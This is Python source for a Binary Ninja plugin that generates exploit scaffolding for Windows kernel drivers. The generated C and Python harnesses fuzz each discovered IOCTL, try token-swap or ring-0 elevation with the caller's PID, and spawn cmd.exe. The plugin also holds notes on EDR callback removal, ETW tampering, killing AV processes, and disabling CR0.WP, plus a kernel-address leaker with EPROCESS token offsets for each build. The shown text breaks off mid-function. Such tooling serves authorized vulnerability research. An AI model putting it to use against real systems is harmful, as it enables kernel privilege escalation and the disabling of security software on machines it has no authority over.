"""
Binary Ninja plugin - POC scaffolding generator.

Emits a compilable C user-mode POC and a Python ctypes harness for the
analyzed driver. Each discovered IOCTL gets a stub with:
  - Buffer size from InputBufferLength / OutputBufferLength heuristic
  - METHOD-aware buffer handling (BUFFERED vs NEITHER vs DIRECT)
  - Primitive-aware payload comments (write-what-where, arb read, etc.)
  - Fuzz loop with size variation

Outputs:
  ~/.logs/WinDriverPOCs/<driver>-poc.c
  ~/.logs/WinDriverPOCs/<driver>-poc.py

USE ON AUTHORIZED TARGETS ONLY.
"""

import os
from binaryninja import BinaryView, log_info, log_warn
from binaryninja.plugin import PluginCommand

from .win_vuln_finder import (
    _find_dispatch_routines, _ioctl_branches_for_dispatcher,
    _ctl_decode, METHOD_MAP,
)
from .win_primitives import (
    _detect_write_what_where, _detect_arb_read, _detect_stack_bof,
    _detect_pool_bof, _detect_token_swap_enabler, _detect_double_fetch,
    _detect_ioring, _detect_null_deref, _deep_text, _detect_name_hints,
)


_NAME_TAG_MAP = {
    'stack buffer overflow': 'stack_bof',
    'pool buffer overflow':  'pool_bof',
    'pool overflow':         'pool_bof',
    'heap/pool':             'pool_bof',
    'write-what-where':      'write_what_where',
    'arbitrary kernel read': 'arb_read',
    'arbitrary kernel write':'write_what_where',
    'arbitrary write':       'write_what_where',
    'arbitrary read':        'arb_read',
    'arbitrary increment':   'arb_increment',
    'arb r/w':               'arb_rw',
    'virtual mem read':      'arb_read',
    'virtual mem write':     'write_what_where',
    'process mem read':      'process_read',
    'process mem write':     'process_write',
    'write to null':         'null_deref',
    'null pointer deref':    'null_deref',
    'null deref':            'null_deref',
    'uninitialized':         'uninit_leak',
    'memory disclosure':     'uninit_leak',
    'info leak':             'uninit_leak',
    'integer overflow':      'int_overflow',
    'type confusion':        'type_confusion',
    'fake object':           'type_confusion',
    'use-after-free':        'uaf',
    'double free':           'uaf',
    'double-fetch':          'double_fetch',
    'race condition':        'race',
    'insecure file':         'insecure_file',
    # privileged
    'msr read':              'msr_rw',
    'msr write':             'msr_rw',
    'port io':               'port_io',
    'port in':               'port_io',
    'port out':              'port_io',
    'phys mem':              'phys_mem',
    'physical memory':       'phys_mem',
    'memory map':            'phys_mem',
    'io space map':          'phys_mem',
    'pci':                   'pci_config',
    'crx read':              'cr_access',
    'crx write':             'cr_access',
    'drx read':              'cr_access',
    'drx write':             'cr_access',
    'gdt':                   'cr_access',
    'idt':                   'cr_access',
    # ring-0
    'ring-0':                'ring0_exec',
    'shellcode':             'ring0_exec',
    # process
    'process kill':          'process_kill',
    'process suspend':       'process_kill',
    'process protection':    'process_protect',
    'token':                 'token_swap',
    # tampering
    'callback removal':      'callback_removal',
    'etw tampering':         'etw_tamper',
    'ssdt':                  'ssdt_tamper',
    # driver/section
    'driver load':           'driver_load',
    'driver map':            'driver_load',
    'section open':          'section_access',
    'section map':           'section_access',
}


def _classify(text, bv=None, instrs=None):
    tags = []
    if _detect_write_what_where(text):   tags.append('write_what_where')
    if _detect_arb_read(text):           tags.append('arb_read')
    if _detect_stack_bof(text):          tags.append('stack_bof')
    if _detect_pool_bof(text):           tags.append('pool_bof')
    if _detect_token_swap_enabler(text): tags.append('token_swap')
    if _detect_double_fetch(text):       tags.append('double_fetch')
    if _detect_null_deref(text):         tags.append('null_deref')
    if _detect_ioring(text):             tags.append('ioring')
    if bv is not None and instrs is not None:
        for _sev, label in _detect_name_hints(bv, instrs):
            ll = label.lower()
            for needle, tag in _NAME_TAG_MAP.items():
                if needle in ll and tag not in tags:
                    tags.append(tag)
    return tags


def _detect_device(bv):
    for s in bv.strings:
        try:
            v = s.value
            lv = v.lower()
            if lv.startswith('\\device\\') or lv.startswith('\\dosdevices\\'):
                return v
        except Exception:
            pass
    return None


def _user_device_path(dev):
    if not dev:
        return r"\\\\.\\REPLACE_ME"
    last = dev.rstrip('\\').split('\\')[-1]
    return r"\\\\.\\" + last


_PAYLOAD_NOTES = {
    'write_what_where': "Write-What-Where: layout often [u64 target_addr][u64 value]. Resize and shuffle.",
    'arb_read':         "Arbitrary read: layout often [u64 src_addr] in / [bytes] out. Use OutputBufferLength.",
    'stack_bof':        "Stack BoF: oversize input buffer to overflow kernel stack frame. Watch /GS cookie.",
    'pool_bof':         "Pool BoF: oversize copy vs allocation; consider LFH bucket spray.",
    'token_swap':       "Token swap enabler: provide current PID; driver may patch Token offset.",
    'double_fetch':     "Double-fetch TOCTOU: race a second thread mutating the user buffer.",
    'null_deref':       "NULL deref: trigger alloc failure path (low-mem / huge size) to crash.",
    'ioring':           "IORING primitive: see knifecoat.com / windows-internals.com for full arb R/W chain.",
    'arb_rw':           "Generic arb R/W primitive. Probe layout: [u64 addr][u64 val] or [u64 addr][u32 len][bytes].",
    'arb_increment':    "Arbitrary increment: layout = [u64 target_addr]. Use to flip _SEP_TOKEN_PRIVILEGES bits.",
    'process_read':     "Process memory read: layout often [u32 pid][u64 va][u32 len]. Returns bytes in out_buf.",
    'process_write':    "Process memory write: layout often [u32 pid][u64 va][u32 len][bytes].",
    'msr_rw':           "MSR R/W: layout often [u32 msr_index] for read or [u32 msr_index][u64 value] for write. Patch LSTAR/STAR/SYSENTER_EIP.",
    'port_io':          "Port IO: layout often [u16 port][u8 size]. Used for PCI/SMRAM/embedded controllers.",
    'phys_mem':         "Physical memory access: layout often [u64 phys_addr][u32 len]. Walk PFN -> kernel VA -> read/write.",
    'pci_config':       "PCI config space: layout often [u8 bus][u8 dev][u8 func][u16 offset][u8 size].",
    'cr_access':        "Control/Debug register access. Disabling CR0.WP enables write to read-only kernel pages (SMEP bypass legacy).",
    'ring0_exec':       "Capcom-style ring-0 exec: pass user function pointer; driver calls it in kernel context. Direct LPE.",
    'process_kill':     "Process kill primitive: pass target PID. EDR/AV bypass class.",
    'process_protect':  "Process protection toggle: flip EPROCESS.SignatureLevel / PsProtection.",
    'callback_removal': "Callback array removal: walk PsSetCreateProcessNotifyRoutine / Cm / Ob callback arrays and zero entries.",
    'etw_tamper':       "ETW tampering: patch EtwThreatIntProvRegHandle or EtwpEventEnabled tables.",
    'ssdt_tamper':      "SSDT hook/unhook: read/write ntoskrnl!KiServiceTable entries.",
    'driver_load':      "Driver load primitive: ZwLoadDriver / IoCreateDriver / MmLoadSystemImage style.",
    'section_access':   "Section open/map: ZwOpenSection + ZwMapViewOfSection of \\KernelObjects\\... or \\Device\\PhysicalMemory.",
    'insecure_file':    "Kernel file/registry access in driver context (no impersonation) - SYSTEM-level R/W on user-supplied path.",
}


def _payload_comment_c(tags):
    if not tags:
        return "    // No primitive detected. Use as plain test harness.\n"
    out = "    // Detected primitives: " + ", ".join(tags) + "\n"
    for t in tags:
        out += "    // - " + (_PAYLOAD_NOTES.get(t) or t) + "\n"
    return out


# ---------------------------------------------------------------------------
# C emitter
# ---------------------------------------------------------------------------

def _emit_c(driver_name, device_path, entries):
    """entries: list of (idx, code, method_name, tags, default_in, default_out)."""
    out = []
    out.append('/*')
    out.append(' * Auto-generated POC scaffolding for: ' + driver_name)
    out.append(' * IOCTLs discovered: ' + str(len(entries)))
    out.append(' * Build (MSVC): cl /W3 /Zi ' + driver_name + '-poc.c')
    out.append(' * USE ON AUTHORIZED TARGETS ONLY.')
    out.append(' */')
    out.append('#include <windows.h>')
    out.append('#include <stdio.h>')
    out.append('#include <stdint.h>')
    out.append('#include <stdlib.h>')
    out.append('#include <string.h>')
    out.append('')
    out.append('#define DEVICE_PATH  "' + device_path + '"')
    out.append('')
    out.append('static HANDLE g_dev = INVALID_HANDLE_VALUE;')
    out.append('')
    out.append('static int open_device(void) {')
    out.append('    g_dev = CreateFileA(DEVICE_PATH,')
    out.append('                        GENERIC_READ | GENERIC_WRITE,')
    out.append('                        FILE_SHARE_READ | FILE_SHARE_WRITE,')
    out.append('                        NULL, OPEN_EXISTING, 0, NULL);')
    out.append('    if (g_dev == INVALID_HANDLE_VALUE) {')
    out.append('        fprintf(stderr, "[!] CreateFile %s failed: %lu\\n", DEVICE_PATH, GetLastError());')
    out.append('        return 0;')
    out.append('    }')
    out.append('    printf("[+] Opened %s -> %p\\n", DEVICE_PATH, g_dev);')
    out.append('    return 1;')
    out.append('}')
    out.append('')
    out.append('static int send_ioctl(DWORD code, void *in_buf, DWORD in_len,')
    out.append('                      void *out_buf, DWORD out_len, DWORD *bytes_ret) {')
    out.append('    DWORD br = 0;')
    out.append('    BOOL ok = DeviceIoControl(g_dev, code, in_buf, in_len,')
    out.append('                              out_buf, out_len, &br, NULL);')
    out.append('    if (bytes_ret) *bytes_ret = br;')
    out.append('    if (!ok) {')
    out.append('        fprintf(stderr, "[!] IOCTL 0x%08X failed: %lu (br=%lu)\\n",')
    out.append('                code, GetLastError(), br);')
    out.append('        return 0;')
    out.append('    }')
    out.append('    return 1;')
    out.append('}')
    out.append('')

    out.append('typedef int (*trigger_fn)(void);')
    out.append('')
    # per-IOCTL stubs
    for idx, code, method, tags, in_sz, out_sz in entries:
        out.append('// --- IOCTL[' + str(idx) + '] 0x' + ('%08X' % code) + ' method=' + method + ' ---')
        out.append('static int trigger_' + str(idx) + '(void) {')
        out.append('    DWORD code = 0x' + ('%08X' % code) + ';')
        out.append('    BYTE  in_buf[0x' + ('%X' % in_sz) + '] = {0};')
        out.append('    BYTE  out_buf[0x' + ('%X' % out_sz) + '] = {0};')
        out.append('    DWORD br = 0;')
        out.append(_payload_comment_c(tags).rstrip('\n'))
        out.append('    return send_ioctl(code, in_buf, sizeof(in_buf), out_buf, sizeof(out_buf), &br);')
        out.append('}')
        out.append('')

    out.append('static trigger_fn g_triggers[] = {')
    for idx, code, method, tags, in_sz, out_sz in entries:
        out.append('    trigger_' + str(idx) + ',')
    out.append('};')
    out.append('')

    # fuzzer
    out.append('static int fuzz_all(unsigned iters) {')
    out.append('    DWORD codes[] = {')
    for _i, code, _m, _t, _is, _os in entries:
        out.append('        0x' + ('%08X' % code) + ',')
    out.append('    };')
    out.append('    BYTE  buf[0x2000];')
    out.append('    BYTE  out_buf[0x2000];')
    out.append('    DWORD br = 0;')
    out.append('    for (unsigned i = 0; i < iters; i++) {')
    out.append('        for (size_t k = 0; k < sizeof(codes)/sizeof(codes[0]); k++) {')
    out.append('            for (size_t j = 0; j < sizeof(buf); j++) buf[j] = (BYTE)rand();')
    out.append('            DWORD in_len  = (rand() % sizeof(buf)) + 1;')
    out.append('            DWORD out_len = (rand() % sizeof(out_buf)) + 1;')
    out.append('            DeviceIoControl(g_dev, codes[k], buf, in_len, out_buf, out_len, &br, NULL);')
    out.append('        }')
    out.append('    }')
    out.append('    return 1;')
    out.append('}')
    out.append('')

    out.append('static int probe_all(void) {')
    out.append('    DWORD codes[] = {')
    for _i, code, _m, _t, _is, _os in entries:
        out.append('        0x' + ('%08X' % code) + ',')
    out.append('    };')
    out.append('    BYTE  in_buf[0x400] = {0};')
    out.append('    BYTE  out_buf[0x400] = {0};')
    out.append('    DWORD br = 0; int hits = 0;')
    out.append('    int n = sizeof(codes)/sizeof(codes[0]);')
    out.append('    printf("[>] Probing %d IOCTLs with zero buffer...\\n", n);')
    out.append('    for (int i = 0; i < n; i++) {')
    out.append('        BOOL ok = DeviceIoControl(g_dev, codes[i], in_buf, sizeof(in_buf),')
    out.append('                                  out_buf, sizeof(out_buf), &br, NULL);')
    out.append('        DWORD err = ok ? 0 : GetLastError();')
    out.append('        printf("  [%3d] 0x%08X %s br=%-5lu winerr=%lu\\n",')
    out.append('               i, codes[i], ok ? "OK " : "ERR", br, err);')
    out.append('        if (ok) hits++;')
    out.append('    }')
    out.append('    printf("[+] Probe done. %d/%d returned success.\\n", hits, n);')
    out.append('    return 1;')
    out.append('}')
    out.append('')
    out.append('static int exploit_elevate(void) {')
    out.append('    printf("[>] Attempting elevation via detected primitives...\\n");')
    out.append('    DWORD pid = GetCurrentProcessId();')
    out.append('    BYTE pid_buf[16] = {0};')
    out.append('    memcpy(pid_buf, &pid, 4);')
    out.append('    int success = 0;')
    elev_codes = [code for _idx, code, _m, tags, _is, _os in entries
                  if any(t in tags for t in ['token_swap', 'ring0_exec', 'write_what_where', 'arb_increment'])]
    if not elev_codes:
        out.append('    printf("    [!] No elevation primitives detected.\\n");')
        out.append('    return 0;')
    else:
        out.append('    DWORD codes[] = {')
        for code in elev_codes:
            out.append('        0x' + ('%08X' % code) + ',')
        out.append('    };')
        out.append('    int n = sizeof(codes)/sizeof(codes[0]);')
        out.append('    for (int i = 0; i < n; i++) {')
        out.append('        DWORD br = 0;')
        out.append('        DWORD sizes[] = {4, 8, 16};')
        out.append('        for (int s = 0; s < 3; s++) {')
        out.append('            if (DeviceIoControl(g_dev, codes[i], pid_buf, sizes[s], NULL, 0, &br, NULL)) {')
        out.append('                printf("[+] Triggered potential elevation IOCTL 0x%08X with size %d\\n", codes[i], sizes[s]);')
        out.append('                success = 1; break;')
        out.append('            }')
        out.append('        }')
        out.append('        if (!success) printf("    [-] IOCTL 0x%08X failed. LastErr: %lu\\n", codes[i], GetLastError());')
        out.append('    }')
    out.append('    return success;')
    out.append('}')
    out.append('')
    out.append('static void spawn_cmd(void) {')
    out.append('    exploit_elevate();')
    out.append('    printf("[+] Spawning cmd.exe...\\n");')
    out.append('    system("cmd.exe");')
    out.append('}')
    out.append('')
    out.append('static void pause_exit(void) {')
    out.append('    puts("\\nPress Enter to exit...");')
    out.append('    (void)getchar();')
    out.append('}')
    out.append('')
    out.append('int main(int argc, char **argv) {')
    out.append('    printf("[*] Target device: %s\\n", DEVICE_PATH);')
    out.append('    if (!open_device()) { pause_exit(); return 1; }')
    out.append('    int rc = 0;')
    out.append('    if (argc < 2) {')
    out.append('        spawn_cmd();')
    out.append('    } else if (_stricmp(argv[1], "fuzz") == 0) {')
    out.append('        unsigned n = (argc > 2) ? (unsigned)atoi(argv[2]) : 1000;')
    out.append('        printf("[>] Fuzzing %u iterations...\\n", n);')
    out.append('        fuzz_all(n);')
    out.append('        puts("[+] Fuzz done.");')
    out.append('    } else if (_stricmp(argv[1], "list") == 0) {')
    out.append('        puts("Index -> IOCTL:");')
    for idx, code, method, tags, _is, _os in entries:
        label = ", ".join(tags) if tags else "(no primitive)"
        out.append('        puts("  ' + str(idx) + ' -> 0x' + ('%08X' % code) +
                   ' ' + method + ' [' + label + ']");')
    out.append('    } else if (_stricmp(argv[1], "shell") == 0 || _stricmp(argv[1], "cmd") == 0) {')
    out.append('        spawn_cmd();')
    out.append('    } else {')
    out.append('        int which = atoi(argv[1]);')
    out.append('        if (which >= 0 && which < (int)(sizeof(g_triggers)/sizeof(g_triggers[0]))) {')
    out.append('            rc = g_triggers[which]();')
    out.append('        } else {')
    out.append('            puts("Unknown index. Use: poc list");')
    out.append('            rc = 2;')
    out.append('        }')
    out.append('    }')
    out.append('    CloseHandle(g_dev);')
    out.append('    pause_exit();')
    out.append('    return rc;')
    out.append('}')
    return "\n".join(out) + "\n"


# ---------------------------------------------------------------------------
# Python emitter
# ---------------------------------------------------------------------------

def _emit_py(driver_name, device_path, entries):
    out = []
    out.append('"""')
    out.append('Auto-generated ctypes POC harness for: ' + driver_name)
    out.append('USE ON AUTHORIZED TARGETS ONLY.')
    out.append('Run: python ' + driver_name + '-poc.py <index>  |  python ' + driver_name + '-poc.py fuzz [iters]')
    out.append('"""')
    out.append('import ctypes, ctypes.wintypes as wt, os, random, sys')
    out.append('')
    out.append('kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)')
    out.append('CreateFileA = kernel32.CreateFileA')
    out.append('CreateFileA.restype = wt.HANDLE')
    out.append('CreateFileA.argtypes = [wt.LPCSTR, wt.DWORD, wt.DWORD, wt.LPVOID, wt.DWORD, wt.DWORD, wt.HANDLE]')
    out.append('DeviceIoControl = kernel32.DeviceIoControl')
    out.append('DeviceIoControl.restype = wt.BOOL')
    out.append('DeviceIoControl.argtypes = [wt.HANDLE, wt.DWORD, wt.LPVOID, wt.DWORD,')
    out.append('                            wt.LPVOID, wt.DWORD, ctypes.POINTER(wt.DWORD), wt.LPVOID]')
    out.append('')
    out.append('GENERIC_RW = 0xC0000000')
    out.append('OPEN_EXISTING = 3')
    out.append('INVALID = wt.HANDLE(-1).value')
    out.append('')
    out.append('DEVICE_PATH = b"' + device_path + '"')
    out.append('')
    out.append('def _pause():')
    out.append('    try: input("\\nPress Enter to exit...")')
    out.append('    except EOFError: pass')
    out.append('')
    out.append('def open_device():')
    out.append('    h = CreateFileA(DEVICE_PATH, GENERIC_RW, 3, None, OPEN_EXISTING, 0, None)')
    out.append('    if h == INVALID:')
    out.append('        err = ctypes.get_last_error()')
    out.append('        raise OSError(f"CreateFile {DEVICE_PATH!r} failed: WinError {err}")')
    out.append('    print(f"[+] Opened {DEVICE_PATH.decode()} -> handle {h:#x}")')
    out.append('    return h')
    out.append('')
    out.append('def ioctl(h, code, in_buf=b"", out_size=0x100):')
    out.append('    in_buf = bytes(in_buf)')
    out.append('    in_arr = (ctypes.c_ubyte * max(len(in_buf), 1))(*in_buf) if in_buf else None')
    out.append('    out_arr = (ctypes.c_ubyte * max(out_size, 1))()')
    out.append('    br = wt.DWORD(0)')
    out.append('    ok = DeviceIoControl(h, code,')
    out.append('                         ctypes.cast(in_arr, wt.LPVOID) if in_arr else None,')
    out.append('                         len(in_buf),')
    out.append('                         ctypes.cast(out_arr, wt.LPVOID), out_size,')
    out.append('                         ctypes.byref(br), None)')
    out.append('    return bool(ok), bytes(out_arr)[:br.value], br.value')
    out.append('')
    out.append('IOCTLS = [')
    for idx, code, method, tags, in_sz, out_sz in entries:
        out.append('    dict(idx=' + str(idx) + ', code=0x' + ('%08X' % code) +
                   ', method=' + repr(method) + ', tags=' + repr(tags) +
                   ', in_size=0x' + ('%X' % in_sz) +
                   ', out_size=0x' + ('%X' % out_sz) + '),')
    out.append(']')
    out.append('')
    out.append('def trigger(h, idx, payload=None, out_size=None):')
    out.append('    entry = IOCTLS[idx]')
    out.append('    code  = entry["code"]')
    out.append('    tags  = entry["tags"]')
    out.append('    print(f"[*] Triggering IOCTL 0x{code:08X} (Index: {idx})")')
    out.append('    if tags:')
    out.append('        print(f"    - Detected primitives: {", ".join(tags)}")')
    out.append('    in_buf = payload if payload is not None else b"\\x00" * entry["in_size"]')
    out.append('    sz_out = out_size if out_size is not None else entry["out_size"]')
    out.append('    ok, data, br = ioctl(h, code, in_buf, sz_out)')
    out.append('    print(f"    - ok={ok} br={br} out[:32]={data[:32].hex()}")')
    out.append('    return ok, data, br')
    out.append('')
    out.append('def fuzz(h, iters=1000):')
    out.append('    print(f"[>] Starting structured fuzzing for {iters} iterations...")')
    out.append('    interesting_sizes = [0, 1, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096]')
    out.append('    interesting_vals = [b"\\x00", b"\\xff", b"\\x41", b"\\xde\\xad\\xbe\\xef"]')
    out.append('    for i in range(iters):')
    out.append('        for e in IOCTLS:')
    out.append('            if random.random() < 0.3:')
    out.append('                sz = random.choice(interesting_sizes)')
    out.append('                val = random.choice(interesting_vals)')
    out.append('                buf = val * (sz // len(val) if len(val) > 0 else 1)')
    out.append('                buf = buf[:sz]')
    out.append('            else:')
    out.append('                sz = random.randint(1, 0x2000)')
    out.append('                buf = os.urandom(sz)')
    out.append('            out_sz = random.choice(interesting_sizes) if random.random() < 0.3 else random.randint(1, 0x2000)')
    out.append('            try:')
    out.append('                print(f"Iter {i} | IOCTL 0x{e[\'code\']:08X} | in_len={len(buf)} | out_len={out_sz}")')
    out.append('                ioctl(h, e["code"], buf, out_sz)')
    out.append('            except OSError as ex:')
    out.append('                print(f"[!] IOCTL 0x{e[\'code\']:08X} failed: {ex}")')
    out.append('                pass')
    out.append('    print("[+] Fuzz done.")')
    out.append('')
    out.append('def probe_all(h):')
    out.append('    print(f"[>] Probing {len(IOCTLS)} IOCTLs with zero-filled buffer (sanity sweep)...")')
    out.append('    hits = 0')
    out.append('    for e in IOCTLS:')
    out.append('        try:')
    out.append('            ok, data, br = ioctl(h, e["code"], b"\\x00" * e["in_size"], e["out_size"])')
    out.append('        except OSError as ex:')
    out.append('            print(f"  [{e[\'idx\']:3d}] 0x{e[\'code\']:08X} EXC {ex}")')
    out.append('            continue')
    out.append('        err = ctypes.get_last_error() if not ok else 0')
    out.append('        marker = "OK " if ok else "ERR"')
    out.append('        if ok: hits += 1')
    out.append('        print(f"  [{e[\'idx\']:3d}] 0x{e[\'code\']:08X} {e[\'method\']:18s} {marker} br={br:<5d} winerr={err}")')
    out.append('    print(f"[+] Probe done. {hits}/{len(IOCTLS)} returned success.")')
    out.append('')
    out.append('def exploit_elevate(h):')
    out.append('    print("[>] Attempting elevation via detected primitives...")')
    out.append('    pid = os.getpid()')
    out.append('    pid_buf = pid.to_bytes(4, "little").ljust(16, b"\\x00")')
    out.append('    success = False')
    out.append('    elev_ioctls = [e for e in IOCTLS if "token_swap" in e["tags"] or "ring0_exec" in e["tags"]]')
    out.append('    if not elev_ioctls:')
    out.append('        print("    [!] No elevation primitives detected.")')
    out.append('        return False')
    out.append('    for e in elev_ioctls:')
    out.append('        for sz in [4, 8, 16]:')
    out.append('            try:')
    out.append('                ok, data, br = ioctl(h, e["code"], pid_buf[:sz])')
    out.append('                if ok:')
    out.append('                    print(f"[+] Triggered potential elevation IOCTL 0x{e[\'code\']:08X} with size {sz}")')
    out.append('                    success = True')
    out.append('                    break')
    out.append('            except OSError as ex:')
    out.append('                pass')
    out.append('        if not success:')
    out.append('            err = ctypes.get_last_error()')
    out.append('            print(f"    [-] IOCTL 0x{e[\'code\']:08X} failed. LastErr: {err}")')
    out.append('    return success')
    out.append('')
    out.append('def spawn_cmd(h):')
    out.append('    exploit_elevate(h)')
    out.append('    print("[+] Spawning cmd.exe...")')
    out.append('    os.system("cmd.exe")')
    out.append('')
    out.append('def main():')
    out.append('    print(f"[*] Target device: {DEVICE_PATH.decode()}")')
    out.append('    print(f"[*] Loaded {len(IOCTLS)} IOCTLs:")')
    out.append('    for e in IOCTLS:')
    out.append('        print(f"      {e[\'idx\']:3d} -> 0x{e[\'code\']:08X} {e[\'method\']:18s} tags={e[\'tags\']}")')
    out.append('    print()')
    out.append('    print("Usage: poc.py            (default: probe all once)")')
    out.append('    print("       poc.py <index>   (trigger one)")')
    out.append('    print("       poc.py fuzz [iters]")')
    out.append('    print()')
    out.append('    try:')
    out.append('        h = open_device()')
    out.append('    except OSError as e:')
    out.append('        print(f"[!] {e}")')
    out.append('        print("    Driver not loaded, wrong device name, or insufficient privileges (try elevated).")')
    out.append('        _pause()')
    out.append('        return 1')
    out.append('    try:')
    out.append('        if len(sys.argv) < 2:')
    out.append('            probe_all(h)')
    out.append('        elif sys.argv[1] in ("shell", "cmd"):')
    out.append('            spawn_cmd(h)')
    out.append('        elif sys.argv[1] == "fuzz":')
    out.append('            n = int(sys.argv[2]) if len(sys.argv) > 2 else 1000')
    out.append('            print(f"[>] Fuzzing {n} iterations across {len(IOCTLS)} IOCTLs...")')
    out.append('            fuzz(h, n)')
    out.append('            print("[+] Fuzz done.")')
    out.append('        else:')
    out.append('            trigger(h, int(sys.argv[1]))')
    out.append('    except Exception as e:')
    out.append('        import traceback')
    out.append('        traceback.print_exc()')
    out.append('        print(f"[!] {e}")')
    out.append('    _pause()')
    out.append('    return 0')
    out.append('')
    out.append('if __name__ == "__main__":')
    out.append('    sys.exit(main() or 0)')
    return "\n".join(out) + "\n"


# ---------------------------------------------------------------------------
# EPROCESS finder emitter
# ---------------------------------------------------------------------------

def _emit_eprocess_finder_c(driver_name, device_path, write_what_where_code, arb_inc_code):
    """Emit a standalone C utility that leaks kernel addresses and prints
    copy-paste defines for the main POC.

    write_what_where_code : IOCTL code for write-what-where (0 = not found)
    arb_inc_code          : IOCTL code for arbitrary increment (0 = not found)
    """
    wwwc = ('0x%08X' % write_what_where_code) if write_what_where_code else '0 /* not detected */'
    ainc = ('0x%08X' % arb_inc_code)          if arb_inc_code          else '0 /* not detected */'

    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * Auto-generated EPROCESS / kernel-address finder for: ' + driver_name)
    a(' * Run on target (no elevation needed for basic info).')
    a(' * Build: cl /W3 /Zi ' + driver_name + '-eprocess-finder.c')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#include <windows.h>')
    a('#include <winternl.h>')
    a('#include <stdio.h>')
    a('#include <stdint.h>')
    a('#include <stdlib.h>')
    a('#include <string.h>')
    a('')
    a('#pragma comment(lib, "advapi32.lib")')
    a('')
    a('static const char * const DEVICE_PATH = "' + device_path + '";')
    a('#define IOCTL_WRITE_WHAT_WHERE   ' + wwwc)
    a('#define IOCTL_ARB_INCREMENT      ' + ainc)
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * NtQuerySystemInformation shim')
    a(' * --------------------------------------------------------------------- */')
    a('typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);')
    a('static pfnNtQSI g_NtQSI;')
    a('')
    a('#define SystemModuleInformation         11')
    a('#define SystemExtendedHandleInformation 64')
    a('#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004L)')
    a('')
    a('typedef struct _RTL_MOD {')
    a('    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize;')
    a('    ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex;')
    a('    USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256];')
    a('} RTL_MOD;')
    a('typedef struct _RTL_MODS { ULONG Count; RTL_MOD Modules[1]; } RTL_MODS;')
    a('')
    a('typedef struct _SYS_HANDLE_EX {')
    a('    PVOID     Object;')
    a('    ULONG_PTR UniqueProcessId;')
    a('    ULONG_PTR HandleValue;')
    a('    ULONG     GrantedAccess;')
    a('    USHORT    CreatorBackTraceIndex;')
    a('    USHORT    ObjectTypeIndex;')
    a('    ULONG     HandleAttributes;')
    a('    ULONG     Reserved;')
    a('} SYS_HANDLE_EX;')
    a('typedef struct _SYS_HANDLE_INFO_EX {')
    a('    ULONG_PTR NumberOfHandles;')
    a('    ULONG_PTR Reserved;')
    a('    SYS_HANDLE_EX Handles[1];')
    a('} SYS_HANDLE_INFO_EX;')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Helpers')
    a(' * --------------------------------------------------------------------- */')
    a('static SYS_HANDLE_INFO_EX *query_all_handles(void) {')
    a('    ULONG sz = 0x20000;')
    a('    for (;;) {')
    a('        SYS_HANDLE_INFO_EX *buf = malloc(sz);')
    a('        if (!buf) return NULL;')
    a('        ULONG out = 0;')
    a('        NTSTATUS st = g_NtQSI(SystemExtendedHandleInformation, buf, sz, &out);')
    a('        if (st == 0) return buf;')
    a('        free(buf);')
    a('        if (st != STATUS_INFO_LENGTH_MISMATCH) return NULL;')
    a('        sz = out + 0x1000;')
    a('    }')
    a('}')
    a('')
    a('static ULONG_PTR handle_to_kva(SYS_HANDLE_INFO_EX *hi, ULONG_PTR pid, HANDLE h) {')
    a('    ULONG_PTR hval = (ULONG_PTR)h;')
    a('    for (ULONG_PTR i = 0; i < hi->NumberOfHandles; i++) {')
    a('        SYS_HANDLE_EX *e = &hi->Handles[i];')
    a('        if (e->UniqueProcessId == pid && e->HandleValue == hval)')
    a('            return (ULONG_PTR)e->Object;')
    a('    }')
    a('    return 0;')
    a('}')
    a('')
    a('static ULONG_PTR get_ntoskrnl_base(char *disk_path_out, size_t path_sz) {')
    a('    RTL_MODS *m = malloc(0x40000);')
    a('    if (!m) return 0;')
    a('    NTSTATUS st = g_NtQSI(SystemModuleInformation, m, 0x40000, NULL);')
    a('    if (st) { free(m); return 0; }')
    a('    ULONG_PTR base = (ULONG_PTR)m->Modules[0].ImageBase;')
    a('    char *name = (char *)m->Modules[0].FullPathName + m->Modules[0].OffsetToFileName;')
    a('    snprintf(disk_path_out, path_sz, "C:\\\\Windows\\\\System32\\\\%s", name);')
    a('    free(m);')
    a('    return base;')
    a('}')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Build-specific offset table')
    a(' * Verify: dt nt!_EPROCESS UniqueProcessId ActiveProcessLinks Token')
    a(' *         dt nt!_TOKEN Privileges')
    a(' * --------------------------------------------------------------------- */')
    a('typedef struct { DWORD build; ULONG pid; ULONG links; ULONG token; ULONG priv; } OFFSETS;')
    a('static const OFFSETS g_off_table[] = {')
    a('    /* build  PID    Links  Token  Priv */')
    a('    { 22631, 0x440, 0x448, 0x4b8, 0x40 }, /* Win11 23H2 */')
    a('    { 22621, 0x440, 0x448, 0x4b8, 0x40 }, /* Win11 22H2 */')
    a('    { 22000, 0x440, 0x448, 0x4b8, 0x40 }, /* Win11 21H2 */')
    a('    { 19045, 0x440, 0x448, 0x4b8, 0x40 }, /* Win10 22H2 */')
    a('    { 19044, 0x440, 0x448, 0x4b8, 0x40 }, /* Win10 21H2 */')
    a('    { 19043, 0x440, 0x448, 0x4b8, 0x40 }, /* Win10 21H1 */')
    a('    { 19042, 0x440, 0x448, 0x4b8, 0x40 }, /* Win10 20H2 */')
    a('    { 19041, 0x440, 0x448, 0x4b8, 0x40 }, /* Win10 2004 */')
    a('    { 18363, 0x2e8, 0x2f0, 0x360, 0x40 }, /* Win10 1909 */')
    a('    { 18362, 0x2e8, 0x2f0, 0x360, 0x40 }, /* Win10 1903 */')
    a('    { 17763, 0x2e8, 0x2f0, 0x358, 0x40 }, /* Win10 1809 */')
    a('    {     0, 0x440, 0x448, 0x4b8, 0x40 }, /* fallback   */')
    a('};')
    a('')
    a('static const OFFSETS *detect_offsets(void) {')
    a('    char buf[16] = {0};')
    a('    DWORD sz = sizeof(buf), build = 0;')
    a('    HKEY hk;')
    a('    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
